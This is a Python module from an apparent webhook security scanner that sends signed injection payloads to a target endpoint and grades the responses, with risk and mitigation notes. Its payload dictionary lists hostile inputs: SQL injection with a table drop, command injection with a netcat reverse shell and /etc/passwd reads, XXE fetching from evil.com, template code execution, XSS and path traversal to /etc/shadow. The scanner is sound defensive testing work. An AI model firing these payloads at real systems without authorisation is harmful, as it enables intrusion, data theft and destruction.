"""
Injection Security Tests for Webhook Auditor

Tests for various injection vulnerabilities including:
- SQL Injection
- NoSQL Injection
- Command Injection
- LDAP Injection
- XML Injection
- XPath Injection
- Template Injection
"""
import httpx
from typing import List, Dict
from ..utils.crypto import calculate_hmac_signature
import json


# Injection test payloads
INJECTION_PAYLOADS = {
    "sql": [
        "' OR '1'='1",
        "admin'--",
        "' OR '1'='1' --",
        "1' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "1' AND '1'='1",
        "' OR 1=1--",
        "admin' OR '1'='1'/*",
    ],
    "nosql": [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "1==1"}',
        '{"$regex": ".*"}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
    ],
    "command": [
        "; ls -la",
        "| cat /etc/passwd",
        "`whoami`",
        "$(whoami)",
        "&& dir",
        "; ping -c 10 127.0.0.1",
        "| nc -e /bin/sh 127.0.0.1 4444",
    ],
    "ldap": [
        "*",
        "*)(&",
        "*)(uid=*))(|(uid=*",
        "admin)(&(password=*)",
        "*))(|(objectClass=*",
    ],
    "xml": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>',
        '<![CDATA[<script>alert("XSS")</script>]]>',
    ],
    "xpath": [
        "' or '1'='1",
        "' or ''='",
        "x' or 1=1 or 'x'='y",
        "//user[name/text()='' or '1'='1']",
    ],
    "template": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{config.items()}}",
        "${T(java.lang.Runtime).getRuntime().exec('calc')}",
        "#{7*7}",
    ],
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "'-alert('XSS')-'",
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "../../../../../../etc/shadow",
    ],
    "header_injection": [
        "test\r\nX-Injected-Header: injected",
        "test\nSet-Cookie: sessionid=malicious",
        "test\r\nHTTP/1.1 200 OK\r\n",
    ],
}


async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
    """
    Run comprehensive injection security tests.
    
    Tests for various injection vulnerabilities by sending crafted payloads
    and checking if the server properly sanitizes/rejects them.
    
    Args:
        config: Scanner configuration object
        client: HTTP client for making requests
    
    Returns:
        List of test result dictionaries
    """
    results = []
    
    # Check if shared secret is provided
    if not config.shared_secret:
        results.append({
            "category": "Injection",
            "name": "Injection Tests",
            "status": "WARN",
            "details": "Skipped - No shared secret provided. These tests require HMAC signature validation."
        })
        return results
    
    secret_bytes = config.shared_secret.encode('utf-8')
    
    # Test 1: SQL Injection in JSON fields
    try:
        sql_test_passed = True
        sql_details = []
        
        for sql_payload in INJECTION_PAYLOADS["sql"][:3]:  # Test first 3
            payload_dict = {
                "event": "user.login",
                "username": sql_payload,
                "email": f"test{sql_payload}@example.com",
                "query": sql_payload
            }
            payload_bytes = json.dumps(payload_dict).encode('utf-8')
            valid_signature = calculate_hmac_signature(secret_bytes, payload_bytes, config.signature_prefix)
            
            headers = {
                "Content-Type": "application/json",
                config.signature_header_name: valid_signature
            }
            
            response = await client.request(
                config.http_method,
                config.target_url,
                content=payload_bytes,
                headers=headers,
                timeout=10.0
            )
            
            # Server should reject (4xx) or safely handle (2xx) but NOT crash (5xx)
            if 500 <= response.status_code < 600:
                sql_test_passed = False
                sql_details.append(f"SQL payload caused server error: {sql_payload[:30]}")
                break
            elif 200 <= response.status_code < 300:
                # Check response for SQL error messages
                response_text = response.text.lower()
                sql_keywords = ['sql', 'mysql', 'postgresql', 'oracle', 'syntax error', 'database']
                if any(keyword in response_text for keyword in sql_keywords):
                    sql_test_passed = False
                    sql_details.append(f"SQL error leaked in response")
                    break
        
        if sql_test_passed:
            results.append({
                "category": "Injection Attacks",
                "name": "SQL Injection Resistance",
                "status": "PASS",
                "details": "Server handled SQL injection attempts without errors or information disclosure"
            })
        else:
            results.append({
                "category": "Injection Attacks",
                "name": "SQL Injection Resistance",
                "status": "FAIL",
                "details": f"SQL injection vulnerability detected: {', '.join(sql_details)}",
                "risk": "Attackers can manipulate database queries to access or modify data",
                "mitigation": "Use parameterized queries/prepared statements, never concatenate user input into SQL"
            })
    except Exception as e:
        results.append({
            "category": "Injection Attacks",
            "name": "SQL Injection Resistance",
            "status": "WARN",
            "details": f"Test failed with error: {str(e)}"
        })
    
    # Test 2: NoSQL Injection
    try:
        nosql_test_passed = True
        
        for nosql_payload in INJECTION_PAYLOADS["nosql"][:2]:
            payload_dict = {
                "event": "user.query",
                "filter": nosql_payload,
                "username": nosql_payload
            }
            payload_bytes = json.dumps(payload_dict).encode('utf-8')
            valid_signature = calculate_hmac_signature(secret_bytes, payload_bytes, config.signature_prefix)
            
            headers = {
                "Content-Type": "application/json",
                config.signature_header_name: valid_signature
            }
            
            response = await client.request(
                config.http_method,
                config.target_url,
                content=payload_bytes,
                headers=headers,
                timeout=10.0
            )
            
            if 500 <= response.status_code < 600:
                nosql_test_passed = False
                break
        
        if nosql_test_passed:
            results.append({
                "category": "Injection Attacks",
                "name": "NoSQL Injection Resistance",
                "status": "PASS",
                "details": "Server handled NoSQL injection attempts safely"
            })
        else:
            results.append({
                "category": "Injection Attacks",
                "name": "NoSQL Injection Resistance",
                "status": "FAIL",
                "details": "NoSQL injection caused server errors",
                "risk": "Attackers can bypass authentication or access unauthorized data in NoSQL databases",
                "mitigation": "Validate and sanitize all user input, use proper query builders, avoid direct object injection"
            })
    except Exception as e:
        results.append({
            "category": "Injection Attacks",
            "name": "NoSQL Injection Resistance",
            "status": "WARN",
            "details": f"Test failed with error: {str(e)}"
        })
    
    # Test 3: Command Injection
    try:
        cmd_test_passed = True
        
        for cmd_payload in INJECTION_PAYLOADS["command"][:3]:
            payload_dict = {
                "event": "file.process",
                "filename": cmd_payload,
                "command": cmd_payload,
                "path": cmd_payload
            }
            payload_bytes = json.dumps(payload_dict).encode('utf-8')
            valid_signature = calculate_hmac_signature(secret_bytes, payload_bytes, config.signature_prefix)
            
            headers = {
                "Content-Type": "application/json",
                config.signature_header_name: valid_signature
            }
            
            response = await client.request(
                config.http_method,
                config.target_url,
                content=payload_bytes,
                headers=headers,
                timeout=10.0
            )
            
            # Check for command execution evidence in response
            response_text = response.text.lower()
            cmd_keywords = ['root:', 'bin/bash', 'command not found', 'system32', 'volume']
            if any(keyword in response_text for keyword in cmd_keywords):
                cmd_test_passed = False
                break
        
        if cmd_test_passed:
            results.append({
                "category": "Injection Attacks",
                "name": "Command Injection Resistance",
                "status": "PASS",
                "details": "Server handled command injection attempts safely"
            })
        else:
            results.append({
                "category": "Injection Attacks",
                "name": "Command Injection Resistance",
                "status": "FAIL",
                "details": "Command injection may be possible - suspicious output detected",
                "risk": "Attackers can execute arbitrary system commands on the server",
                "mitigation": "Never pass user input to system commands, use safe APIs, validate and whitelist input"
            })
    except Exception as e:
        results.append({
            "category": "Injection Attacks",
            "name": "Command Injection Resistance",
            "status": "WARN",
            "details": f"Test failed with error: {str(e)}"
        })
    
    # Test 4: XSS (Cross-Site Scripting)
    try:
        xss_test_passed = True
        reflected_xss = []
        
        for xss_payload in INJECTION_PAYLOADS["xss"][:3]:
            payload_dict = {
                "event": "comment.created",
                "comment": xss_payload,
                "name": xss_payload,
                "message": xss_payload
            }
            payload_bytes = json.dumps(payload_dict).encode('utf-8')
            valid_signature = calculate_hmac_signature(secret_bytes, payload_bytes, config.signature_prefix)
            
            headers = {
                "Content-Type": "application/json",
                config.signature_header_name: valid_signature
            }
            
            response = await client.request(
                config.http_method,
                config.target_url,
                content=payload_bytes,
                headers=headers,
                timeout=10.0
            )
            
            # Check if XSS payload is reflected in response without encoding
            if xss_payload in response.text or '<script>' in response.text.lower():
                xss_test_passed = False
                reflected_xss.append(xss_payload[:30])
        
        if xss_test_passed:
            results.append({
                "category": "Injection Attacks",
                "name": "XSS (Cross-Site Scripting) Protection",
                "status": "PASS",
                "details": "Server properly encodes output, no XSS payloads reflected"
            })
        else:
            results.append({
                "category": "Injection Attacks",
                "name": "XSS (Cross-Site Scripting) Protection",
                "status": "FAIL",
                "details": f"XSS vulnerability detected - payloads reflected unencoded: {', '.join(reflected_xss)}",
                "risk": "Attackers can inject malicious scripts to steal user data or perform actions on behalf of users",
                "mitigation": "Encode all user input in output, use Content-Security-Policy headers, validate input"
            })
    except Exception as e:
        results.append({
            "category": "Injection Attacks",
            "name": "XSS (Cross-Site Scripting) Protection",
            "status": "WARN",
            "details": f"Test failed with error: {str(e)}"
        })
    
    # Test 5: Path Traversal
    try:
        path_test_passed = True
        
        for path_payload in INJECTION_PAYLOADS["path_traversal"][:3]:
            payload_dict = {
                "event": "file.read",
                "filename": path_payload,
                "path": path_payload,
                "file": path_payload
            }
            payload_bytes = json.dumps(payload_dict).encode('utf-8')
            valid_signature = calculate_hmac_signature(secret_bytes, payload_bytes, config.signature_prefix)
            
            headers = {
                "Content-Type": "application/json",
                config.signature_header_name: valid_signature
            }
            
            response = await client.request(
                config.http_method,
                config.target_url,
                content=payload_bytes,
                headers=headers,
                timeout=10.0
            )
            
            # Check for file content in response
            response_text = response.text.lower()
            path_keywords = ['root:', '[boot loader]', 'system32', '/etc/', 'windows']
            if any(keyword in response_text for keyword in path_keywords):
                path_test_passed = False
                break
        
        if path_test_passed:
            results.append({
                "category": "Injection Attacks",
                "name": "Path Traversal Protection",
                "status": "PASS",
                "details": "Server protected against path traversal attempts"
            })
        else:
            results.append({
                "category": "Injection Attacks",
                "name": "Path Traversal Protection",
                "status": "FAIL",
                "details": "Path traversal vulnerability detected - system files may be accessible",
                "risk": "Attackers can read sensitive files from the server file system",
                "mitigation": "Validate file paths, use whitelists, avoid direct file path construction from user input"
            })
    except Exception as e:
        results.append({
            "category": "Injection Attacks",
            "name": "Path Traversal Protection",
            "status": "WARN",
            "details": f"Test failed with error: {str(e)}"
        })
    
    # Test 6: Template Injection
    try:
        template_test_passed = True
        
        for template_payload in INJECTION_PAYLOADS["template"][:3]:
            payload_dict = {
                "event": "render.template",
                "template": template_payload,
                "message": template_payload
            }
            payload_bytes = json.dumps(payload_dict).encode('utf-8')
            valid_signature = calculate_hmac_signature(secret_bytes, payload_bytes, config.signature_prefix)
            
            headers = {
                "Content-Type": "application/json",
                config.signature_header_name: valid_signature
            }
            
            response = await client.request(
                config.http_method,
                config.target_url,
                content=payload_bytes,
                headers=headers,
                timeout=10.0
            )
            
            # Check if template was evaluated (e.g., {{7*7}} becomes 49)
            if '49' in response.text or 'config' in response.text.lower():
                template_test_passed = False
                break
        
        if template_test_passed:
            results.append({
                "category": "Injection Attacks",
                "name": "Template Injection Protection",
                "status": "PASS",
                "details": "Server protected against template injection"
            })
        else:
            results.append({
                "category": "Injection Attacks",
                "name": "Template Injection Protection",
                "status": "FAIL",
                "details": "Template injection vulnerability detected",
                "risk": "Attackers can execute arbitrary code through template engines",
                "mitigation": "Use safe template rendering, sandbox template execution, validate template input"
            })
    except Exception as e:
        results.append({
            "category": "Injection Attacks",
            "name": "Template Injection Protection",
            "status": "WARN",
            "details": f"Test failed with error: {str(e)}"
        })
    
    return results
